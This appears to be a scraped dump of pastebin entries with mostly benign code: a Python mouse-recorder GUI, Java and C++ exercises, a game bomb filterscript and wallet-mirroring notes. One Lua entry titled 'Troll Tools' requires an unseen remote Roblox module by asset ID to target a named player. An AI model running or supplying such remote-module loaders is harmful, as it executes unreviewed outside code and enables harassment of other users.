        if self.playback_button['state'] == tk.NORMAL:
            self.start_playback()

    def start_playback(self):
        if not self.playback_thread or not self.playback_thread.is_alive():
            repeat_count = int(self.repeat_count_spinbox.get())
            playback_speed = self.playback_speed_scale.get()
            self.playback_thread = threading.Thread(target=self.playback_events, args=(repeat_count, playback_speed))
            self.playback_thread.start()

    def playback_events(self, repeat_count, playback_speed):
        # Logic for playing back the events
        try:
            for i in range(repeat_count):
                if self.playback_stop_requested:
                    break
                self.loop_counter = i + 1
                self.root.after(0, self.update_loop_counter_label)
                last_event_time = 0
                for event in self.recorded_events:
                    if self.playback_stop_requested:
                        break
                    event_type = event[0]
                    event_time = event[-1]  # Event time is always the last element
                    time.sleep(max(0, (event_time - last_event_time) / playback_speed))
                    last_event_time = event_time
                    if event_type == 'click':
                        _, x, y, button_name, pressed, _ = event
                        button = getattr(mouse.Button, button_name) if button_name else None
                        mouse_controller = mouse.Controller()
                        mouse_controller.position = (x, y)
                        if pressed:
                            mouse_controller.press(button)
                        else:
                            mouse_controller.release(button)
                    elif event_type == 'move':
                        _, x, y, _ = event
                        mouse_controller = mouse.Controller()
                        mouse_controller.position = (x, y)
            self.playback_stop_requested = False
        except Exception as e:
            messagebox.showerror(""Playback Error"", str(e))

    def save_events(self):
        recording_name = simpledialog.askstring(""Save Recording"", ""Enter a name for the recording:"")
        if recording_name:
            recording_dir = os.path.join(self.recordings_dir, recording_name.replace(' ', '_'))
            os.makedirs(recording_dir, exist_ok=True)
            filepath = os.path.join(recording_dir, 'events')
            with shelve.open(filepath) as shelf:
                shelf['events'] = self.recorded_events
            messagebox.showinfo(""Success"", ""Events saved successfully."")

    def load_events(self):
        recording_name = self.choose_recording()
        if recording_name:
            filepath = os.path.join(self.recordings_dir, recording_name, 'events')
            with shelve.open(filepath) as shelf:
                self.recorded_events = shelf['events']
            self.update_event_listbox()
            # Enable playback button if events were loaded
            self.playback_button.config(state=tk.NORMAL)
            messagebox.showinfo(""Success"", ""Events loaded successfully."")

    def choose_recording(self):
        recordings = [d for d in os.listdir(self.recordings_dir) if os.path.isdir(os.path.join(self.recordings_dir, d))]
        if not recordings:
            messagebox.showinfo(""Load Recording"", ""No recordings found."")
            return None
        recording_name = simpledialog.askstring(""Load Recording"", ""Enter the recording name:"")
        if recording_name in recordings:
            return recording_name
        else:
            messagebox.showerror(""Error"", ""Recording not found."")
            return None

    def update_event_listbox(self):
        self.event_listbox.delete(0, tk.END)
        for event in self.recorded_events:
            event_type, x, y, *rest = event
            event_str = f""{event_type} at ({x}, {y})""
            self.event_listbox.insert(tk.END, event_str)

    def update_loop_counter_label(self):
        self.loop_counter_label.config(text=f""Loop Count: {self.loop_counter}"")
        
    def configure_playback(self):
        config_window = tk.Toplevel(self.root)
        config_window.title(""Playback Configuration"")

        # Create a listbox to list all recordings
        recordings_listbox = Listbox(config_window, selectmode=tk.EXTENDED)
        recordings_listbox.pack()

        # Populate the listbox with available recordings
        for recording in os.listdir(self.recordings_dir):
            recordings_listbox.insert(tk.END, recording)

        # Add buttons to add recordings to the playback queue
        tk.Button(config_window, text=""Add to Playback Queue"",
                  command=lambda: self.add_to_playback_queue(recordings_listbox)).pack()
        
        # Add buttons to remove recordings from the playback queue
        tk.Button(config_window, text=""Remove from Playback Queue"",
                  command=lambda: self.remove_from_playback_queue(recordings_listbox)).pack()

        # Add listbox to show current playback queue
        self.playback_queue_listbox = Listbox(config_window)
        self.playback_queue_listbox.pack()

        # Add playback controls for the queue
        tk.Button(config_window, text=""Play Queue"",
                  command=self.playback_queue).pack()

    def add_to_playback_queue(self, recordings_listbox):
        selections = recordings_listbox.curselection()
        for i in selections:
            self.playback_queue_listbox.insert(tk.END, recordings_listbox.get(i))

    def remove_from_playback_queue(self, recordings_listbox):
        selections = self.playback_queue_listbox.curselection()
        # Must delete from the end to avoid index shifting issues
        for i in reversed(selections):
            self.playback_queue_listbox.delete(i)

    def playback_queue(self):
        # Logic to playback the queue
        queue = list(self.playback_queue_listbox.get(0, tk.END))
        for recording_name in queue:
            filepath = os.path.join(self.recordings_dir, recording_name, 'events')
            with shelve.open(filepath) as shelf:
                self.recorded_events = shelf['events']
            # Playback each recording
            self.start_playback()    

if __name__ == ""__main__"":
        root = tk.Tk()
        app = MouseRecorderGUI(root)
        root.mainloop()
"
qbPm7dM3,Sleep Tracker Average With Text Input,ssunlimited,Java,Monday 29th of April 2024 03:53:31 PM CDT,"import java.util.*;
import java.io.*;

public class SleepAVG{
   public static void main(String[] args){
      try{
      Scanner console = new Scanner(new File (""Sleep Tracker.txt""));
      List<Integer> daysSleepTime = new ArrayList<Integer>();
      while(console.hasNextInt()){
      int hours = console.nextInt();
      int minutes = console.nextInt();
      int total = (hours * 60) + minutes;
      daysSleepTime.add(total);
      }
      int total = 0;
      for(int sleepTime : daysSleepTime) total += sleepTime;
      double sleepAVG = (double) Math.round(total * 100 /daysSleepTime.size()/60) / 100.00;
      System.out.println(""Your sleep average is "" +
      Math.round(Math.floor(sleepAVG)) + "" hours and "" + Math.round(
      ((sleepAVG - Math.floor(sleepAVG)) * 60)) + "" minutes."");
         }
      
      catch (FileNotFoundException e) {
      System.out.println(""An error occurred."");
      e.printStackTrace();
      }
   }
}"
5M3cVKGg,CyberPi-barchart1,miklik,Python,Monday 29th of April 2024 03:33:42 PM CDT,"from cyberpi import *
import random

@event.start
def on_start():
    display.set_brush(""red"")
    barchart.add(random.randint(10,90))
    display.set_brush(""blue"")
    barchart.add(random.randint(10,90))
    display.set_brush(""green"")
    barchart.add(random.randint(10,90))"
JNvhXW0Z,CyberPi-linechart1,miklik,Python,Monday 29th of April 2024 03:21:38 PM CDT,"from cyberpi import *
import random

@event.start
def on_start():
    display.set_brush(""blue"")
    linechart.set_step(1)
    y = 50
    s = 2
    for i in range(120):
        y = y + random.randint(-s,s)
        if y < 0: y = 0
        linechart.add(y)"
VZmzVESS,C++ coloured #define with RGB function,ohusq,C++,Monday 29th of April 2024 03:10:11 PM CDT,"// Color Attributes for SetConsoleTextAttribute()
#define BLACK         0
#define DARK_BLUE     FOREGROUND_BLUE
#define DARK_GREEN    FOREGROUND_GREEN
#define DARK_CYAN     (FOREGROUND_GREEN | FOREGROUND_BLUE)
#define DARK_RED      FOREGROUND_RED
#define DARK_MAGENTA  (FOREGROUND_RED | FOREGROUND_BLUE)
#define DARK_YELLOW   (FOREGROUND_RED | FOREGROUND_GREEN)
#define GRAY          (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)
#define DARK_GRAY     (FOREGROUND_INTENSITY)
#define BLUE          (FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define GREEN         (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define CYAN          (FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define RED           (FOREGROUND_RED | FOREGROUND_INTENSITY)
#define MAGENTA       (FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define YELLOW        (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define WHITE         (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)


#include <windows.h>

// Function prototype
void SetColorRGB(int r, int g, int b);

int main() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    
    // Example usage: Set to a color with full red and green components (yellow)
    SetColorRGB(255, 255, 0);

    printf(""This text is in custom color based on RGB input.\n"");

    // Reset to default attributes
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);

    return 0;
}

// Function definition
void SetColorRGB(int r, int g, int b) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    WORD color = 0;

    // Red component
    if (r > 128) color |= FOREGROUND_RED;
    // Green component
    if (g > 128) color |= FOREGROUND_GREEN;
    // Blue component
    if (b > 128) color |= FOREGROUND_BLUE;

    // Adjust intensity
    if (r > 192 || g > 192 || b > 192) color |= FOREGROUND_INTENSITY;

    SetConsoleTextAttribute(hConsole, color);
}

"
c4KAzrzm,Troll Tools,robinmollen,Lua,Monday 29th of April 2024 03:09:12 PM CDT,"require(9852838317).troll(""YourNameHere"")"
92CZhjma,C++ Coloured console output.,ohusq,C++,Monday 29th of April 2024 02:47:52 PM CDT,"// color your text in Windows console mode
// colors are 0=black 1=blue 2=green and so on to 15=white  
// colorattribute = foreground + background * 16
// to get red text on yellow use 4 + 14*16 = 228
// light red on yellow would be 12 + 14*16 = 236
// a Dev-C++ tested console application by  vegaseat  07nov2004

#include <iostream>
#include <windows.h>   // WinApi header

using namespace std;    // std::cout, std::cin

int main()
{
  HANDLE  hConsole;
	int k;
	
  hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

  // you can loop k higher to see more color choices
  for(k = 1; k < 255; k++)
  {
    // pick the colorattribute k you want
    SetConsoleTextAttribute(hConsole, k);
    cout << k << "" I want to be nice today!"" << endl;
  }
  
  cin.get(); // wait
  return 0;
}"
whY3qWr5,iBomb v1.2 by inshal,Rei_Ayanami,Pawn,Monday 29th of April 2024 02:39:58 PM CDT,"/*===================================CREDITS====================================
							FILTER SCRIPT CREATED BY
									inshal
						[iBomb] Attach Bomb to a player
									v1.2
         		http://forum.sa-mp.com/showthread.php?p=2961629
//============================================================================*/


//=================================INCLUDES=====================================
#include <a_samp>
#include <sscanf2>
#include <zcmd>
//==============================================================================


//==================================NEW=========================================
new BombAttached[MAX_PLAYERS];
new AttemptedToBombRecently[MAX_PLAYERS];
new HasBombedRecently[MAX_PLAYERS];
new AttemptedToDefuseBombRecently[MAX_PLAYERS];
new Text:Bomb;
new Text:ExpTime[3];
new VehicleBombed[MAX_VEHICLES];
new HasBlownVehicleRecently[MAX_PLAYERS];
new ExplosionTime[MAX_PLAYERS];
//==============================================================================


//==============================FORWARDS========================================
forward OneSVariables();
forward Explosion();
forward Float:GetDistanceBetweenPlayers(p1,p2);
//==============================================================================



//===============================COLORS=========================================
#define RED 0xFF0000AA
#define LIGHTGREEN 0x33AA33AA
#define GREY 0xAFAFAFAA
//==============================================================================
public OnFilterScriptInit()
{
        print(""\n--------------------------------------"");
        print("" iBomb Filterscript v1.2 loaded!"");
        print(""--------------------------------------\n"");

        SetTimer(""OneSVariables"",1000,1);

//=================================TEXTDRAWS====================================
		Bomb = TextDrawCreate(503.500000, 127.750053, ""Bombed"");
		TextDrawLetterSize(Bomb, 0.449999, 1.600000);
		TextDrawAlignment(Bomb, 1);
		TextDrawColor(Bomb, RED);
		TextDrawSetShadow(Bomb, 0);
		TextDrawSetOutline(Bomb, 1);
		TextDrawBackgroundColor(Bomb, 51);
		TextDrawFont(Bomb, 3);
		TextDrawSetProportional(Bomb, 1);

		ExpTime[0] = TextDrawCreate(409.500000, 337.500000, ""usebox"");
		TextDrawLetterSize(ExpTime[0], 0.000000, 2.296668);
		TextDrawTextSize(ExpTime[0], 223.000000, 0.000000);
		TextDrawAlignment(ExpTime[0], 1);
		TextDrawColor(ExpTime[0], 0);
		TextDrawUseBox(ExpTime[0], true);
		TextDrawBoxColor(ExpTime[0], 102);
		TextDrawSetShadow(ExpTime[0], 0);
		TextDrawSetOutline(ExpTime[0], 0);
		TextDrawFont(ExpTime[0], 0);

		ExpTime[1] = TextDrawCreate(232.500000, 339.360046, ""Explosion time: 10"");
		TextDrawLetterSize(ExpTime[1], 0.449999, 1.600000);
		TextDrawAlignment(ExpTime[1], 1);
		TextDrawColor(ExpTime[1], -16776961);
		TextDrawSetShadow(ExpTime[1], 0);
		TextDrawSetOutline(ExpTime[1], 1);
		TextDrawBackgroundColor(ExpTime[1], 51);
		TextDrawFont(ExpTime[1], 3);
		TextDrawSetProportional(ExpTime[1], 1);
//==============================================================================
        return 1;
}

public OnFilterScriptExit()
{
        print(""\n----------------------------------"");
        print("" iBomb Filterscript v1.2 unloaded!"");
        print(""----------------------------------\n"");
        return 1;
}

public OnPlayerConnect(playerid)
{
		SendClientMessage(playerid, LIGHTGREEN, ""[INFO]{FFFFFF}: iBomb v1.2 by inshal is successfully being used in this server."");
        return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
		TextDrawDestroy(Bomb);
        return 1;
}

public OnPlayerSpawn(playerid)
{
        AttemptedToBombRecently[playerid] =0;
		HasBombedRecently[playerid] =0;
		AttemptedToDefuseBombRecently[playerid] =0;
		BombAttached[playerid] =0;
		HasBlownVehicleRecently[playerid] =0;
		TextDrawHideForPlayer(playerid, Bomb);
		TextDrawHideForPlayer(playerid, ExpTime[0]);
		TextDrawHideForPlayer(playerid, ExpTime[1]);
		ExplosionTime[playerid] =0;
        return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
		AttemptedToBombRecently[playerid] =0;
		HasBombedRecently[playerid] =0;
		AttemptedToDefuseBombRecently[playerid] =0;
		BombAttached[playerid] =0;
		HasBlownVehicleRecently[playerid] =0;
		TextDrawHideForPlayer(playerid, Bomb);
		TextDrawHideForPlayer(playerid, ExpTime[0]);
		TextDrawHideForPlayer(playerid, ExpTime[1]);
		ExplosionTime[playerid] =0;
        return 1;
}

public OnVehicleSpawn(vehicleid)
{
        return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
        return 1;
}

public OnPlayerText(playerid, text[])
{
        return 1;
}

//================================COMMANDS======================================
CMD:plantbomb(playerid,params[])
{
	#pragma unused params
	new pName[MAX_PLAYER_NAME], string[128];
	if(!IsPlayerInAnyVehicle(playerid))
	{
	    SendClientMessage(playerid,RED,""[ERROR]{FFFFFF} You are not in any vehicle. How are you supposed to blow one up?"");
	    return 1;
	}
	if(HasBlownVehicleRecently[playerid] >= 1)
	{
		format(string, sizeof(string),""[ERROR]{FFFFFF} Please wait {FF0000}%d seconds{FFFFFF} before bombing a car again."",HasBlownVehicleRecently[playerid]);
		SendClientMessage(playerid,RED,string);
	 	return 1;
	}
 	new pveh =GetPlayerVehicleID(playerid);
	GetPlayerName(playerid, pName, MAX_PLAYER_NAME);
	SendClientMessage(playerid,RED,""[INFO]{FFFFFF} You have successfully bombed the vehicle and it is about to explode in 10 seconds."");
	HasBlownVehicleRecently[playerid] =120;
	SetPlayerScore(playerid, GetPlayerScore(playerid)+1);
    SetPVarString(playerid, ""Name"", pName);
	VehicleBombed[pveh] =10;
	return 1;
}

CMD:pb(playerid, params[]) return cmd_plantbomb(playerid, params);


CMD:bomb(playerid,params[])
{
        new targetid, string[128], pName[MAX_PLAYER_NAME+1];
        new crand = random(50);
        if(GetDistanceBetweenPlayers(playerid, targetid) > 4) return SendClientMessage(playerid, RED, ""[ERROR]{FFFFFF} Player is too far away."");
        if(sscanf(params, ""u"", targetid)) return SendClientMessage(playerid, RED, ""[USAGE]{FFFFFF} /bomb [name/id]"")&&
												 SendClientMessage(playerid, GREY, ""[FUNCTION]{FFFFFF} Will attach a bomb to a player."");
        if(!IsPlayerConnected(targetid)) return SendClientMessage(playerid, RED, ""[ERROR]{FFFFFF} Player not found."");
        if(BombAttached[targetid] == 1) return SendClientMessage(playerid, RED, ""[ERROR]{FFFFFF} A bomb is already attached to the player."");
//        if(playerid == targetid) return SendClientMessage(playerid, RED, ""[ERROR]{FFFFFF} You cannot attach a bomb on yourself!"");
        if(IsPlayerInAnyVehicle(targetid)) return SendClientMessage(playerid, RED, ""[ERROR]{FFFFFF} The player is in a vehicle."");
        if(HasBombedRecently[playerid] >= 1)
		{
			format(string, sizeof(string),""[ERROR]{FFFFFF} Please wait {FF0000}%d seconds{FFFFFF} before bombing someone again."",HasBombedRecently[playerid]);
			SendClientMessage(playerid,RED,string);
	 		return 1;
		}
		if(AttemptedToBombRecently[playerid] >= 1)
		{
			format(string, sizeof(string),""[ERROR]{FFFFFF} Please wait {FF0000}%d seconds{FFFFFF} before trying to bomb someone again."",AttemptedToBombRecently[playerid]);
			SendClientMessage(playerid,RED,string);
	 		return 1;
		}
		if(crand <= 25) return AttemptedToBombRecently[playerid] =30, SendClientMessage(playerid, RED, ""[FAIL]{FFFFFF} You have failed to attach the bomb on the player."");
        if(crand > 25)
        {
            GetPlayerName(playerid, pName, MAX_PLAYER_NAME);
        	SendClientMessage(playerid, LIGHTGREEN, ""[SUCCESSFUL]{FFFFFF} You have attached the bomb on the player and it will detonate in 10 seconds."");
         	SendClientMessage(targetid, RED, ""[DANGER]{FFFFFF} A bomb has been attached on you and will detonate in 10 seconds!"");
			SendClientMessage(targetid, GREY, ""[TIP]{FFFFFF} You can try to defuse the bomb by using /defusebomb."");
        	//SetTimer(""Explosion"", 10000, false);
            BombAttached[targetid] =1;
            TextDrawShowForPlayer(playerid, Bomb);
			HasBombedRecently[playerid] =60;
			//SetPVarString(playerid, ""Name"", pName);
			//SetPVarInt(playerid, ""ID"", playerid);
			SetPlayerScore(playerid, GetPlayerScore(playerid)+1);
			SetPlayerAttachedObject(targetid, 2,1252,1,0.10,-0.18,0.01,8.0,85.0,-4.0,0.86,1.16,1.00);
			ExplosionTime[targetid] =10;
			TextDrawShowForPlayer(targetid, ExpTime[0]);
			TextDrawShowForPlayer(targetid, ExpTime[1]);
        }
        return 1;
}

CMD:defusebomb(playerid,params[])
{
        new crand = random(40), string[128];
        if(BombAttached[playerid] == 0) return SendClientMessage(playerid, RED, ""[ERROR]{FFFFFF} There is no bomb attached on you."");
        if(AttemptedToDefuseBombRecently[playerid] >= 1)
		{
			format(string, sizeof(string),""[ERROR]{FFFFFF} Please wait {FF0000}%d seconds{FFFFFF} before trying to defuse a bomb again."",AttemptedToDefuseBombRecently[playerid]);
			SendClientMessage(playerid,RED,string);
	 		return 1;
		}
		if(crand <= 20) return AttemptedToDefuseBombRecently[playerid] =30, SendClientMessage(playerid, RED, ""[FAIL]{FFFFFF} You have failed to defuse the bomb."");
        if(crand > 20)
        {
        	SendClientMessage(playerid, LIGHTGREEN, ""[SUCCESSFUL]{FFFFFF} You have successfully defused the bomb."");
            BombAttached[playerid] =0;
            TextDrawHideForPlayer(playerid, Bomb);
			RemovePlayerAttachedObject(playerid, 2);
			ExplosionTime[playerid] =0;
			TextDrawHideForPlayer(playerid, ExpTime[0]);
			TextDrawHideForPlayer(playerid, ExpTime[1]);
        }
        return 1;
}
//==============================================================================
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
        return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
        return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
        return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
        return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{
        return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
        return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
        return 1;
}

public OnRconCommand(cmd[])
{
        return 1;
}

public OnPlayerRequestSpawn(playerid)
{
        return 1;
}

public OnObjectMoved(objectid)
{
        return 1;
}

public OnPlayerObjectMoved(playerid, objectid)
{
        return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
        return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
        return 1;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
        return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
        return 1;
}

public OnPlayerSelectedMenuRow(playerid, row)
{
        return 1;
}

public OnPlayerExitedMenu(playerid)
{
        return 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
        return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
        return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
        return 1;
}

public OnPlayerUpdate(playerid)
{
        return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
        return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
        return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
        return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
        return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
        return 1;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
        return 1;
}


//================================STOCKS AND OTHERS=============================
/*
public Explosion()
{
        for(new i=0; i<MAX_PLAYERS; i++)
        {
            if(IsPlayerConnected(i))
            {
                if(BombAttached[i] == 1)
                {
                new string[128], Float:x, Float:y, Float:z;
                //new pName[MAX_PLAYER_NAME+1];
				GetPlayerPos(i, x, y, z);
				CreateExplosion(x,y,z,6,10.0);
            	SetPlayerHealth(i, 0);
             	BombAttached[i] =0;
				format(string, sizeof(string), ""[DEATH]{FFFFFF} %s[%d] has been blown up with a bomb"" attached by %s[%d]."""", GetName(i), i, GetPVarString(i, ""Name"", pName), GetPVarInt(i, ""ID""));
				SendClientMessageToAll(RED, string);
				TextDrawHideForPlayer(i, Bomb);
				}
			}
        }
}
*/
public OneSVariables()
{
    for(new i=0; i<MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
     		if(HasBombedRecently[i] >= 1)
			{
			    HasBombedRecently[i] --;
			}
			if(HasBlownVehicleRecently[i] >= 1)
			{
			    HasBlownVehicleRecently[i] --;
			}
   			if(AttemptedToBombRecently[i] >= 1)
			{
			    AttemptedToBombRecently[i] --;
			}
   			if(AttemptedToDefuseBombRecently[i] >= 1)
			{
			    AttemptedToDefuseBombRecently[i] --;
			}
			if(ExplosionTime[i] >= 1)
			{
			    new string[50];
				format(string, sizeof(string), ""Explosion Time: %d"", ExplosionTime[i]);
				TextDrawSetString(ExpTime[1], string);
			    ExplosionTime[i] --;
			}
			if(ExplosionTime[i] == 0)
			{
   				if(IsPlayerConnected(i))
            	{
                	if(BombAttached[i] == 1)
                	{
		                new string[128], Float:x, Float:y, Float:z;
		                //new pName[MAX_PLAYER_NAME+1];
						GetPlayerPos(i, x, y, z);
						CreateExplosion(x,y,z,6,10.0);
		            	SetPlayerHealth(i, 0);
		             	BombAttached[i] =0;
						format(string, sizeof(string), ""[DEATH]{FFFFFF} %s[%d] has been blown to bits with a bomb.""/* attached by %s[%d].*/"""", GetName(i), i/*, GetPVarString(i, ""Name"", pName), GetPVarInt(i, ""ID"")*/);
						SendClientMessageToAll(RED, string);
						TextDrawHideForPlayer(i, Bomb);
						TextDrawHideForPlayer(i, ExpTime[0]);
						TextDrawHideForPlayer(i, ExpTime[1]);
						ExplosionTime[i] =0;
					}
				}
			}
            for(new v=0; v<MAX_VEHICLES; v++)
			{
				if(VehicleBombed[v] > 1)
 				{
	        		VehicleBombed[v] --;
				}
				if(VehicleBombed[v] == 1)
				{
  					new Float:x, Float:y, Float:z;
		    		GetVehiclePos(v, x, y, z);
					CreateExplosion(x, y, z, 6, 10.0);
		    		SetVehicleToRespawn(v);
		    		VehicleBombed[v] =0;
		    		SendClientMessageToAll(RED, ""[INFO]{FFFFFF} The vehicle which was bombed by %s has been exploded."");
				}
			}
		}
 	}
}
public Float:GetDistanceBetweenPlayers(p1,p2)
{
        new Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2;
        if (!IsPlayerConnected(p1) || !IsPlayerConnected(p2))
        {
                return -1.00;
        }
        GetPlayerPos(p1,x1,y1,z1);
        GetPlayerPos(p2,x2,y2,z2);
        return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}

stock GetName(playerid)
{
	new Name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,Name,MAX_PLAYER_NAME);
	return Name;
}
//=============================================================================="
KmG4w7RP,Untitled,Abu3safeer,Python,Monday 29th of April 2024 02:03:55 PM CDT,"import argparse
from pathlib import Path
import subprocess
import json
from argparse import ArgumentParser
from datetime import datetime

def get_ext_by_codec(codec_name):
    if codec_name in ['SubStationAlpha', 'S_TEXT/ASS', 'S_TEXT/SSA']:
        ext = 'ass'
    elif codec_name in ['SubRip/SRT', 'S_TEXT/UTF8', 'S_ARIBSUB']:
        ext = 'srt'
    elif codec_name in ['S_TEXT/WEBVTT', 'D_WEBVTT/SUBTITLES']:
        ext = 'vtt'
    elif codec_name in ['S_HDMV/PGS', 'S_HDMV/TEXTST', 'S_DVBSUB']:
        ext = 'sup'
    else:
        ext = 'ass'
    return ext


def extract_all_subtitles(file: Path):
    print(f'file {file.name}')
    command = [""mkvmerge"", ""-J"", file]
    result = subprocess.run(command, capture_output=True, text=True)

    # Check if the command was successful
    if result.returncode == 0:
        # Parse the JSON response
        mkv_info = json.loads(result.stdout)

        # Now 'mkv_info' is a Python dictionary containing information about the MKV file
        # You can access specific fields like mkv_info['tracks'], etc.
        for track in mkv_info['tracks']:
            track_codec = track['codec']
            track_id = track['id']
            track_type = track['type']
            track_language = track['properties']['language']
            if track_type == 'subtitles':
                extension = get_ext_by_codec(track_codec)
                subprocess.run(['mkvextract', 'tracks', file, f'{track_id}:subs/{file.name[:-4]}.{track_id}.{track_language}.{extension}'])
                print(f'Track {track_id} codec: {track_codec} language: {track_language} type: {track_type}')
    else:
        time_now = datetime.now().strftime(""%Y-%m-%d %H:%M"")
        # Print an error message if the command failed
        with open('error.txt', 'a') as f:
            f.write(result.stderr)
            f.write(f'[{time_now}] Error: cannot process file {file} {result.stderr}\n')
            f.close()

        print(f""[{time_now}] Error: cannot process file {file} {result.stderr}"")


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('filename', metavar='filename', type=str)
    args = parser.parse_args()
    print(args.filename)
    file = Path(args.filename)
    extract_all_subtitles(file)"
NL6NdBpu,Mirror Samourai wallet source code,nintendo1889,PowerShell,Monday 29th of April 2024 01:54:46 PM CDT,"If you're trying to mirror samourai, they are on keybase.

https://keybase.io/samourai

The canary from archive.org's last fetch on april 24th does verify, ( the canary itself was updated on march 24th). https://web.archive.org/web/20240424023612/https://samouraiwallet.com/canary


Mirror the Samourai wallet source code

In powershell:

run:

gh auth login

Login with a browser with your account to get a token (prevents git spam imho). Your github account does _not_ need to be a member of the Samourai-Wallet github Org.

then run:

gh repo list Samourai-Wallet --json=nameWithOwner --limit 1000 -q "".[].nameWithOwner""  | %{gh repo clon
e $_}

size (476,939,295 bytes)"
aW2L5fkX,Test browser (Novely),AhmadXploit,Dart,Monday 29th of April 2024 01:40:49 PM CDT,"{
  ""browsers"": [
    {
      ""imgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_2_xy3r9y.jpg"",
      ""logoUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_1_dvvxtk.jpg"",
      ""name"": ""Alan Walker"",
      ""instagram"": ""@alanwalker"",
      ""stories"": [
        {
          ""title"": ""Cerita cinta"",
          ""tags"": ""#hinata"",
          ""thumbnail"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_2_xy3r9y.jpg"",
          ""chapters"": [
            {
              ""chapterNumber"": 1,
              ""title"": ""Chapter 1"",
              ""rating"": ""4.5"",
              ""content"": ""Pada zaman dahulu kala, ada seorang anak yang...""
            },
            {
              ""chapterNumber"": 2,
              ""title"": ""Chapter 2"",
              ""rating"": ""4.2"",
              ""content"": ""Pada hari minggu ku turut ayah ke kota...""
            }
          ]
        }
      ]
    },
    {
      ""imgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_2_xy3r9y.jpg"",
      ""logoUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_1_dvvxtk.jpg"",
      ""name"": ""SZA"",
      ""instagram"": ""@sza"",
      ""stories"": [
        {
          ""title"": ""Cerita cinta"",
          ""tags"": ""#naruto"",
          ""thumbnail"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_2_xy3r9y.jpg"",
          ""chapters"": [
            {
              ""chapterNumber"": 1,
              ""title"": ""Chapter 1"",
              ""rating"": ""4.5"",
              ""content"": ""Pada zaman dahulu kala, ada seorang anak yang...""
            },
            {
              ""chapterNumber"": 2,
              ""title"": ""Chapter 2"",
              ""rating"": ""4.2"",
              ""content"": ""Pada hari minggu ku turut ayah ke kota...""
            }
          ]
        }
      ]
    }
  ]
}"
e8Abu8cY,C,Ankit_132,C++,Monday 29th of April 2024 01:36:55 PM CDT,"#include<bits/stdc++.h>
using namespace std;

const int N=3e5+5;
int a[N];
long long f[N][15];

int main(){
    int tst;
	cin>>tst;
	
	while(tst--){
	    int n, m;
		cin>>n>>m;
		
		for(int i=1;i<=n;i++)       cin>>a[i];
		for(int i=1;i<=m;i++)       f[0][i]=1e18;
		
		for(int i=1;i<=n;i++){
			for(int j=0;j<=m;j++)
			    f[i][j]=f[i-1][j]+a[i];
			
			for(int val=1e9, j=0; j<=min(i-1,m);    j++){
				val=min(val,a[i-j]);
				for(int k=j;k<=m;k++)
				    f[i][k]=min(f[i][k],f[i-j-1][k-j]+1ll*(j+1)*val);
			}
		}
		cout<<f[n][min(n-1,m)]<<""\n"";
	}
}"
zx7BA4eE,D,Ankit_132,C++,Monday 29th of April 2024 01:36:53 PM CDT,"#include <bits/stdc++.h>
using namespace std;

#define int long long

signed main(){
    int tst;
    cin>>tst;
    
    while(tst--){
        int n, k;
        cin >> n >> k;
        
        vector<pair<int, int>> c(n + 1);
        for (int i = 1; i <= n; i++) {
    		cin >> c[i].second;
    	}
    	
    	int res = 0;
    	for (int i = 1; i <= n; i++) {
    		cin >> c[i].first;
    		res += max(0ll, c[i].first - c[i].second);
    	}
    	
    	sort(c.begin() + 1, c.end());
    	
    	priority_queue<int> q;
    	
    	int ans = 0, sum = 0;
    	for (int i = n; i; i--) {
